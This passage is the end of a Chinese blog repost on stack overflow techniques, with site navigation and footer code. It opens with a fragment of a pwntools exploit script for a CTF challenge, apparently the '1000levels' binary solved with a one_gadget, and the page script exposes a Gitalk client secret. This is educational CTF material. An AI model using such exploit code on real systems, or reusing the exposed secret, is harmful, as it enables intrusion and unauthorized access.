p.recvuntil(‘\n’)[:-1]p.sendline(str(b))<br>p.recvuntil(“input index\n”)p.sendline(str(offset+2))p.recvuntil(“now value(hex) “)addr2 &#x3D; p.recvuntil(‘\n’)[:-1]p.sendline(str(c))p.recvuntil(“input index\n”)p.sendline(‘a’)p.interactive()<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png" alt="Test" title="栈溢出技巧（下）"><br>本文涉及相关实���：高级栈溢出技术—ROP实战（split） （通过该实验学习ROP概念及其思路，了解高级栈溢出时需要注意的事项，并掌握解决方法，同时通过练习给出的关卡来增强实践能力。）</p><div class="post-copyright"><div class="content"><p>本文标题： 推荐系列-栈溢出技巧（下）</p><p>本文作者： OSChina</p><p>发布时间： 2021年04月15日 10:08</p><p>最后更新： 2022年06月22日 17:43</p><p>原始链接： <a class="post-url" href="/aeff58fe/" title="推荐系列-栈溢出技巧（下）">https://www.hosiang.cn/aeff58fe/</a></p><p>版权声明： 本文著作权归作者所有，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank">CC BY-NC-SA 4.0</a>许可协议，转载请注明出处！</p><footer><a href="https://www.hosiang.cn"><img src="/../images/logo.png" alt="Howe Hsiang"> Howe Hsiang</a></footer></div></div><div class="page-reward"><a id="rewardBtn" href="javascript:;">赏</a></div><div id="reward" class="post-modal reward-lay"><a class="close" href="javascript:;" id="reward-close">×</a> <span class="reward-title"><i class="icon icon-quote-left"></i> 喜欢就赞赏一下呗！ <i class="icon icon-quote-right"></i></span><div class="reward-content"><div class="reward-code"><img id="rewardCode" src="/images/threepay_code.jpg" alt="打赏二维码"></div><div class="reward-select"></div></div></div></div><footer class="article-footer"><div class="post-share"><a href="javascript:" id="share-sub" class="post-share-fab"><i class="fa fa-share-alt" style="padding-top:11px!important"></i></a><div class="post-share-list" id="share-list"><ul class="share-icons"><li><a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://www.hosiang.cn/aeff58fe/" data-title="Facebook" rel="external nofollow noopener noreferrer"><i class="fa fa-facebook" style="padding-top:9px!important"></i></a></li><li><a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《推荐系列-栈溢出技巧（下）》 — 狂欢马克思&url=https://www.hosiang.cn/aeff58fe/&via=https://www.hosiang.cn" data-title="Twitter" rel="external nofollow noopener noreferrer"><i class="fa fa-twitter" style="padding-top:9px!important"></i></a></li><li><a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://www.hosiang.cn/aeff58fe/" data-title="Google+" rel="external nofollow noopener noreferrer"><i class="fa fa-google-plus" style="padding-top:9px!important"></i></a></li><li><a class="qq share-sns" target="_blank" href="https://connect.qq.com/widget/shareqq/index.html?url=https://www.hosiang.cn/aeff58fe/&title=《推荐系列-栈溢出技巧（下）》 — 狂欢马克思&source=&amp;emsp;&amp;emsp;基于报错类的栈保护 canary这个值被称作金丝雀(“canary”)值，指的是矿工曾利用金丝雀来确认是否有气体泄..." data-title="QQ" rel="external nofollow noopener noreferrer"><i class="fa fa-qq" style="padding-top:9px!important"></i></a></li><li><a class="weixin share-sns" id="wxFab" href="javascript:" data-title="微信"><i class="fa fa-weixin" style="padding-top:9px!important"></i></a></li><li><a class="weibo share-sns" target="_blank" href="https://service.weibo.com/share/share.php?url=https://www.hosiang.cn/aeff58fe/&title=《推荐系列-栈溢出技巧（下）》 — 狂欢马克思&pic=https://www.hetianlab.com/specialized/headImg.action?news=ae049e09-2ea3-4143-a7d4-4971a19aec22.png" data-title="微博" rel="external nofollow noopener noreferrer"><i class="fa fa-weibo" style="padding-top:9px!important"></i></a></li></ul></div></div><div class="post-modal wx-share" id="wxShare"><a class="close" href="javascript:" id="wxShare-close">×</a><p>扫一扫，分享到微信</p><img src="//api.qrserver.com/v1/create-qr-code/?data=https://www.hosiang.cn/aeff58fe/" alt="微信分享二维码"></div><div class="mask"></div><ul class="article-footer-menu"><li class="article-footer-tags"><i class="fa fa-tags"></i> <a href="/tags/Popular/" class="color3">Popular</a></li></ul></footer></div></article><aside class="post-toc-pos post-toc-top" id="post-toc"><nav class="post-toc-wrap"><ol class="post-toc"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%B1%BB%E7%9A%84%E6%A0%88%E4%BF%9D%E6%8A%A4"><span class="post-toc-text">基于报错类的栈保护</span></a></li></ol><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#stack-smash%E5%8E%9F%E7%90%86"><span class="post-toc-text">stack smash原理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%80"><span class="post-toc-text">题目一</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BA%8C"><span class="post-toc-text">题目二</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%89"><span class="post-toc-text">题目三</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#context-arch-x3D-%E2%80%98amd64%E2%80%99"><span class="post-toc-text">context.arch &#x3D; ‘amd64’</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#context-log-level-x3D-%E2%80%98debug%E2%80%99"><span class="post-toc-text">context.log_level &#x3D; ‘debug’</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#context-terminal-x3D-%E2%80%98deepin-terminal%E2%80%99-%E2%80%98-x%E2%80%99-%E2%80%98sh%E2%80%99-%E2%80%99-c%E2%80%99"><span class="post-toc-text">context.terminal &#x3D; [‘deepin-terminal’, ‘-x’, ‘sh’ ,’-c’]</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#gdb-attach-p"><span class="post-toc-text">gdb.attach(p)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x7fffffffcb88-0x555555554c74-go-248"><span class="post-toc-text">0x7fffffffcb88 | 0x555555554c74 (go()+248)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x7fffffffcb90-0x1"><span class="post-toc-text">0x7fffffffcb90 | 0x1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x7fffffffcb98-0x555560531c95"><span class="post-toc-text">0x7fffffffcb98 | 0x555560531c95</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x7fffffffcba0-0x2"><span class="post-toc-text">0x7fffffffcba0 | 0x2</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#p-x3D-process-%E2%80%98-x2F-1000levels%E2%80%99"><span class="post-toc-text">p &#x3D; process(‘.&#x2F;1000levels’)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#one-gadget-x3D-0x3f306"><span class="post-toc-text">one_gadget &#x3D; 0x3f306</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#for-i-in-range-999"><span class="post-toc-text">for i in range(999):</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#context-arch-x3D-%E2%80%98amd64%E2%80%99-1"><span class="post-toc-text">context.arch &#x3D; ‘amd64’</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#context-log-level-x3D-%E2%80%98debug%E2%80%99-1"><span class="post-toc-text">context.log_level &#x3D; ‘debug’</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#context-terminal-x3D-%E2%80%98deepin-terminal%E2%80%99-%E2%80%98-x%E2%80%99-%E2%80%98sh%E2%80%99-%E2%80%99-c%E2%80%99-1"><span class="post-toc-text">context.terminal &#x3D; [‘deepin-terminal’, ‘-x’, ‘sh’ ,’-c’]</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#print-hex-one-gadget-addr"><span class="post-toc-text">print hex(one_gadget_addr)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#gdb-attach-p-1"><span class="post-toc-text">gdb.attach(p)</span></a></li></nav></aside><nav id="article-nav"><a href="/ccf81835/" id="article-nav-newer" class="article-nav-link-wrap"><span class="article-nav-title"><i class="fa fa-hand-o-left" aria-hidden="true"></i> 推荐系列-开源项目用英文标识符就能招徕国外用户吗- </span></a><a href="/5e7aa08/" id="article-nav-older" class="article-nav-link-wrap"><span class="article-nav-title">推荐系列-用Toolkit 高效集成HMS Core，程序员下班都早一点</span> <i class="fa fa-hand-o-right" aria-hidden="true"></i></a></nav><div id="gitalk"></div><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalk=new Gitalk({repo:"bolg-comment",owner:"Hosiang1026",admin:"Hosiang1026",clientID:"37a2dd4473e8970cecc2",clientSecret:"e30efa17d86d9de4f4ab810872dc62a7b2e7e634",pagerDirection:"last",distractionFreeMode:!0,createIssueManually:!1});gitalk.render("gitalk")</script></section></div><footer id="footer"><div class="outer"><div id="footer-info" class="inner"><script id="_wau78w">var _wau=_wau||[];_wau.push(["small","5dnguv4c2n","78w"])</script><script async src="//waust.at/s.js"></script><p><span id="busuanzi_container_site_uv" style="display:none"><span class="post-count">总字数：<span>1777.3k</span> </span>总访客数：<span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" style="display:none">总访问量：<span id="busuanzi_value_site_pv"></span></span><br><span id="TimeShow">本站</span><span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span><br>Copyright&copy; 2018 - 2022 狂欢马克思 <a href="https://beian.miit.gov.cn" rel="external nofollow noopener noreferrer" target="_blank">京ICP备17060439号</a></p></div></div><script>var now=new Date;function createtime(){var n=new Date("2017/09/18");now.setTime(now.getTime()+250),days=(now-n)/1e3/60/60/24,dnum=Math.floor(days),hours=(now-n)/1e3/60/60-24*dnum,hnum=Math.floor(hours),1==String(hnum).length&&(hnum="0"+hnum),minutes=(now-n)/1e3/60-1440*dnum-60*hnum,mnum=Math.floor(minutes),1==String(mnum).length&&(mnum="0"+mnum),seconds=(now-n)/1e3-86400*dnum-3600*hnum-60*mnum,snum=Math.round(seconds),1==String(snum).length&&(snum="0"+snum),document.getElementById("timeDate").innerHTML="安全运行 "+dnum+" 天 ",document.getElementById("times").innerHTML=hnum+" 小时 "+mnum+" 分 "+snum+" 秒"}setInterval("createtime()",800)</script></footer><script>var mihoConfig={root:"https://www.hosiang.cn",animate:"true",isHome:"false",share:"true",reward:" 1"}</script><div class="sidebar"><div id="sidebar-search" title="Search"><i class="fa fa-search"></i></div><div id="sidebar-category" title="Categories"><i class="fa fa-book"></i></div><div id="sidebar-tag" title="Tags"><i class="fa fa-tags"></i></div><div id="sidebar-top"><span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span></div></div><div class="sidebar-menu-box" id="sidebar-menu-box"><div class="sidebar-menu-box-container"><div id="sidebar-menu-box-categories"><a class="category-link" href="/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/">兴趣爱好</a><a class="category-link" href="/categories/%E5%85%B6%E4%BB%96%E5%BC%80%E5%8F%91/">其他开发</a><a class="category-link" href="/categories/%E5%89%8D%E6%B2%BF%E5%BC%80%E5%8F%91/">前沿开发</a><a class="category-link" href="/categories/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/">前端开发</a><a class="category-link" href="/categories/%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/">升级版本</a><a class="category-link" href="/categories/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/">博客教程</a><a class="category-link" href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/">后端开发</a><a class="category-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><a class="category-link" href="/categories/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/">日常记录</a><a class="category-link" href="/categories/%E7%83%AD%E9%97%A8%E6%96%87%E7%AB%A0/">热门文章</a></div><div id="sidebar-menu-box-tags"><a href="/tags/Ajax/" style="font-size:10px">Ajax</a> <a href="/tags/AliGenie/" style="font-size:10px">AliGenie</a> <a href="/tags/Alipay/" style="font-size:10px">Alipay</a> <a href="/tags/Android/" style="font-size:10px">Android</a> <a href="/tags/Blockchain/" style="font-size:17.5px">Blockchain</a> <a href="/tags/CQRS/" style="font-size:10px">CQRS</a> <a href="/tags/Database/" style="font-size:15px">Database</a> <a href="/tags/Docker/" style="font-size:10px">Docker</a> <a href="/tags/EasyUI/" style="font-size:10px">EasyUI</a> <a href="/tags/Guitar/" style="font-size:10px">Guitar</a> <a href="/tags/Hackintosh/" style="font-size:12.5px">Hackintosh</a> <a href="/tags/Hexo/" style="font-size:15px">Hexo</a> <a href="/tags/IntelliJ-IDEA/" style="font-size:10px">IntelliJ IDEA</a> <a href="/tags/Java/" style="font-size:12.5px">Java</a> <a href="/tags/Kali-Linux/" style="font-size:10px">Kali Linux</a> <a href="/tags/Life/" style="font-size:17.5px">Life</a> <a href="/tags/Mac-OS/" style="font-size:12.5px">Mac OS</a> <a href="/tags/MultiThread/" style="font-size:10px">MultiThread</a> <a href="/tags/NodeJS/" style="font-size:10px">NodeJS</a> <a href="/tags/Popular/" style="font-size:20px">Popular</a> <a href="/tags/Python/" style="font-size:10px">Python</a> <a href="/tags/SaaS/" style="font-size:10px">SaaS</a> <a href="/tags/Servlet/" style="font-size:10px">Servlet</a> <a href="/tags/Spring/" style="font-size:17.5px">Spring</a> <a href="/tags/Upgrade/" style="font-size:10px">Upgrade</a> <a href="/tags/Web/" style="font-size:10px">Web</a> <a href="/tags/Windows/" style="font-size:10px">Windows</a> <a href="/tags/Work/" style="font-size:10px">Work</a> <a href="/tags/iOS/" style="font-size:10px">iOS</a></div></div><a href="javascript:" class="sidebar-menu-box-close">&times;</a></div><div class="mobile-header-menu-nav" id="mobile-header-menu-nav"><div class="mobile-header-menu-container"><span class="title">导航</span><ul class="mobile-header-menu-navbar"><li><a href="/"><i class="fa fa-home"></i><span>主页</span></a></li><li><a href="/archives"><i class="fa fa-archive"></i><span>归档</span></a></li><li><a href="/gitbook"><i class="fa fa-columns"></i><span>笔记</span></a></li><li><a href="/music"><i class="fa fa-music"></i><span>音乐</span></a></li><li><a href="/photo"><i class="fa fa-picture-o"></i><span>相册</span></a></li><li><a href="/love"><i class="fa fa-heart"></i><span>恋爱</span></a></li><li><a href="/collection"><i class="fa fa-envira"></i><span>收藏</span></a></li><li><a href="/about"><i class="fa fa-user"></i><span>关于</span></a></li></ul></div><div class="mobile-header-tag-container"><span class="title">标签</span><div id="mobile-header-container-tags"><a href="/tags/Ajax/" style="font-size:10px">Ajax</a> <a href="/tags/AliGenie/" style="font-size:10px">AliGenie</a> <a href="/tags/Alipay/" style="font-size:10px">Alipay</a> <a href="/tags/Android/" style="font-size:10px">Android</a> <a href="/tags/Blockchain/" style="font-size:17.5px">Blockchain</a> <a href="/tags/CQRS/" style="font-size:10px">CQRS</a> <a href="/tags/Database/" style="font-size:15px">Database</a> <a href="/tags/Docker/" style="font-size:10px">Docker</a> <a href="/tags/EasyUI/" style="font-size:10px">EasyUI</a> <a href="/tags/Guitar/" style="font-size:10px">Guitar</a> <a href="/tags/Hackintosh/" style="font-size:12.5px">Hackintosh</a> <a href="/tags/Hexo/" style="font-size:15px">Hexo</a> <a href="/tags/IntelliJ-IDEA/" style="font-size:10px">IntelliJ IDEA</a> <a href="/tags/Java/" style="font-size:12.5px">Java</a> <a href="/tags/Kali-Linux/" style="font-size:10px">Kali Linux</a> <a href="/tags/Life/" style="font-size:17.5px">Life</a> <a href="/tags/Mac-OS/" style="font-size:12.5px">Mac OS</a> <a href="/tags/MultiThread/" style="font-size:10px">MultiThread</a> <a href="/tags/NodeJS/" style="font-size:10px">NodeJS</a> <a href="/tags/Popular/" style="font-size:20px">Popular</a> <a href="/tags/Python/" style="font-size:10px">Python</a> <a href="/tags/SaaS/" style="font-size:10px">SaaS</a> <a href="/tags/Servlet/" style="font-size:10px">Servlet</a> <a href="/tags/Spring/" style="font-size:17.5px">Spring</a> <a href="/tags/Upgrade/" style="font-size:10px">Upgrade</a> <a href="/tags/Web/" style="font-size:10px">Web</a> <a href="/tags/Windows/" style="font-size:10px">Windows</a> <a href="/tags/Work/" style="font-size:10px">Work</a> <a href="/tags/iOS/" style="font-size:10px">iOS</a></div></div></div><div class="search-wrap"><span class="search-close">&times;</span> <a href="javascript:" class="header-icon waves-effect waves-circle waves-light" id="back"><i class="icon icon-lg icon-chevron-left"></i> </a><input class="search-field" placeholder="Search..." id="keywords"> <a id="search-submit" href="javascript:"><i class="fa fa-search"></i></a><div class="search-container" id="search-container"><ul class="search-result" id="search-result"></ul></div></div><div id="search-tpl"><li class="search-result-item"><a href="{url}" class="search-item-li"><span class="search-item-li-title" title="{title}">{title}</span></a></li></div><script src="/js/search.js"></script><script src="/js/main.js"></script><script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script><div id="particles"></div><script src="/js/particles.js"></script><link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css"><script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script><script src="/js/animate.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{jsonPath:"/live2dw/assets/hijiki.model.json"},display:{position:"right",width:150,height:300},mobile:{show:!0,scale:.5},log:!1})</script></body></html>